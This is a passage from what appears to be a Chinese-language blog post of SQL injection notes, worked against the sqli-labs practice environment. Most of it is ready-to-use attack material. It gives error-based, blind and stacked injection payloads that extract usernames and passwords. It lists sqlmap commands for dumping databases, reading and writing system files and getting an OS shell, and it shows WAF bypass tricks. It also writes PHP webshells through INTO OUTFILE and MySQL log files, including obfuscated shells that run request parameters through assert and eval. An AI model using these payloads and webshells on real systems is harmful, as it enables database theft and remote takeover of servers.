class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor的讲解参考：<a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">floor,count,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>冲突报错<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) a)<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count() ,concat(<span class="hljs-string">&#x27;~&#x27;</span>(<span class="hljs-keyword">select</span> concat(username,&quot;;&quot;,<span class="hljs-keyword">password</span>,&quot;;&quot;)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)x))<span class="hljs-comment">-- +</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)x))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>参考<a href="https://blog.csdn.net/weixin_54217950/article/details/122938063">https://blog.csdn.net/weixin_54217950/article/details/122938063</a></p><p>如果显示不完整：<br>substring(database(),5,10)<br>Substring是字符截取函数，从数据里面第五个字符开始截取十个字符</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p><code>if(expr1,expr2,expr3)</code>-&gt;如果expr1是true，则返回expr2；否则返回expr3。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment">#用ascii码的好处：MYSQL不区分大小写&#x27;s&#x27;=&#x27;S&#x27;为真</span><br><span class="hljs-attribute">1</span>&#x27; and if(ord(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> columns from words<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h4 id="改表、字段名"><a href="#改表、字段名" class="headerlink" title="改表、字段名"></a>改表、字段名</h4><p>有words表和1919810931114514表情况下</p><pre><code class="hljs"> 1. 将表words的名称改为其他的（如words1）， 2. 将1919810931114514改为words. 3. 将flag改为id, 4. 在输入栏中输入1&#39; or 1=1,将其中的数据全部输出，即为flag.</code></pre><p>  语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> words <span class="hljs-keyword">to</span> words1 ;<br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> <span class="hljs-number">1919810931114514</span> <span class="hljs-keyword">to</span> words ;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><p>sqlmap使用</p><p>参考资料：<a href="https://blog.csdn.net/u011377996/article/details/81368482">https://blog.csdn.net/u011377996/article/details/81368482</a><br>sql注入的防御：<br><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a><br><a href="https://www.freebuf.com/vuls/265308.html">https://www.freebuf.com/vuls/265308.html</a></p><p>常用语句：<br>判断是否存在注入 sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a><br>读取日志的请求进行检测 sqlmap -l request.txt<br>查询当前的所有数据库 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –dbs<br>获取数据库下的表名 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security –tables<br>获取表中的字段名 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security -T users –columns<br>获取字段的内容 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security -T users -C username,password –dump<br>获取数据库的所有用户 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –users<br>获取数据库用户的密码 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –password<br>获取当前数据库的名称 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –current-db<br>获取当前数据库的用户 sqlmap.py -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –current-user<br>sqlmap获取数据库名、数据库表、数据库字段<br>sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –current-db<br>sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security –tables<br>sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security -T users –columns<br>获取指定表中的数据 sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> -D security -T users –dump<br>获取所有表的数据 sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –dump-all<br>sqlmap读取系统文件 sqlmap -u <a href="http://192.168.75.141/sqli-labs/Less-1/?id=1">http://192.168.75.141/sqli-labs/Less-1/?id=1</a> –file-read&#x3D;&#x2F;etc&#x2F;os-release<br>sqlmap写入系统文件 sqlmap -u <a href="http://192.168.75.141/sqli-labs/Less-1/?id=1">http://192.168.75.141/sqli-labs/Less-1/?id=1</a> –file-write&#x3D;&#x2F;root&#x2F;test.php –file-dest&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;test.php<br>sqlmap执行系统命令 sqlmap -u <a href="http://192.168.75.141/sqli-labs/Less-1/?id=1">http://192.168.75.141/sqli-labs/Less-1/?id=1</a> –os-shell</p><p>参数：</p><p>–level 探测等级：1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent&#x2F;Referer在level为3时就会测试。<br>–risk 危险登录：1-3，默认为1，等级越高，越可能对数据库造成破坏<br>–id-dba 确认当前用户为管理权限（是否为root权限，mssql下最高权限为sa）<br>–sql-shell 运行自定义sql语句<br>–os-cmd,–os-shell 运行任意操作系统命令<br>–file-read 从数据库服务器中读取文件<br>–file-write 上传文件到数据库服务器中<br>–flush-session 清空已保存的会话信息<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a href="http://local:8080/">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒)<br>–threads&#x3D; 使用多少线程</p><p>Bypass waf**</p><p>绕过and、or</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-string">||</span><br><span class="hljs-meta">&amp;&amp;</span><br></code></pre></td></tr></table></figure><p>绕过空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>绕过order by</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>order<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>by <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>绕过union select</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>unIon<br>selECt<br></code></pre></td></tr></table></figure><p>绕过database(),user()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/),user(/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>)<br></code></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(<span class="hljs-comment">/*///*/</span>)<br></code></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where%<span class="hljs-number">20</span>table_schema=database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/) and/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>table_name=<span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>fuzz</p><h2 id="mysql写shell、提权"><a href="#mysql写shell、提权" class="headerlink" title="mysql写shell、提权"></a>mysql写shell、提权</h2><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，在 Windows 环境下成功率会很高。</p><h4 id="outfile和dumpfile"><a href="#outfile和dumpfile" class="headerlink" title="outfile和dumpfile"></a>outfile和dumpfile</h4><p>条件</p><ol><li><p>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p></li><li><p>gpc为off，on的话单引号被转义了，语句就不能正常执行了</p></li><li><p>要有file权限，默认情况下只有root有</p></li></ol><p><code>select user,file_priv from mysql.user;</code></p><ol start="4"><li><p>对目录要有写权限</p></li><li><p><code>secure_file_priv</code>的值非NULL或为导出的绝对路径</p></li></ol><p>​secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>​Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br>​Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>​<code>show global variables like &#39;%secure_file_priv%&#39;;</code></p><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml"></span><br><span class="language-xml">hex</span><br><span class="language-xml">id=-1&#x27; union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile &quot;C:/shell.php&quot;%23</span><br></code></pre></td></tr></table></figure><h4 id="非union"><a href="#非union" class="headerlink" title="非union"></a>非union</h4><p>使用<code>fields terminated by</code>与<code>lines terminated by</code>写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e %23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e %23</span><br></code></pre></td></tr></table></figure><h4 id="outfile和dumpfile的区别"><a href="#outfile和dumpfile的区别" class="headerlink" title="outfile和dumpfile的区别"></a>outfile和dumpfile的区别</h4><p><strong>outfile</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">支持多行数据同时导出<br>使用<span class="hljs-built_in">union</span>联合查询时，要保证两侧查询的列数相同<br>会在换行符制表符后面追加反斜杠<br>会在末尾追加换行(所以不能直接写入二进制文件)<br></code></pre></td></tr></table></figure><p><strong>dumpfile</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">每次只能导出一行数据<br>不会在换行符制表符后面追加反斜杠<br>不会在末尾追加换行<br>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<span class="hljs-keyword">dump</span> <span class="hljs-keyword">file</span>，应该手动添加 limit 限制<br></code></pre></td></tr></table></figure><h3 id="日志写shell-general-log"><a href="#日志写shell-general-log" class="headerlink" title="日志写shell(general_log)"></a>日志写shell(general_log)</h3><p><code>secure_file_priv</code><br> Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br> Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>在5.5.53版本后无法用sql语句修改<code>secure_file_priv</code> ，利用日志将shell写入日志中</p><p>条件</p><ol><li><p>对目录要有写权限</p></li><li><p>高权限运行 MySQL 或者 Apache</p></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;;</span><br><span class="language-xml">开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log = on;</span><br><span class="language-xml">设置日志路径</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">执行查询，写入shell</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml">结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml">set global general_log = off;</span><br><span class="language-xml"></span><br><span class="language-xml">SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h3 id="慢查询getshell-slow-query-log"><a href="#慢查询getshell-slow-query-log" class="headerlink" title="慢查询getshell(slow_query_log)"></a>慢查询getshell(slow_query_log)</h3><p>如果是普通日志，开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p><p>使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看慢查询信息是否开启<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow_query_log%&#x27;</span>;<br>启用慢查询日志(默认禁用)<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>修改日志文件路径<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;<br>查看写入慢日志的时间要求<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>        <br>执行查询，写入shell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p><code>user defined function</code>，用户自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 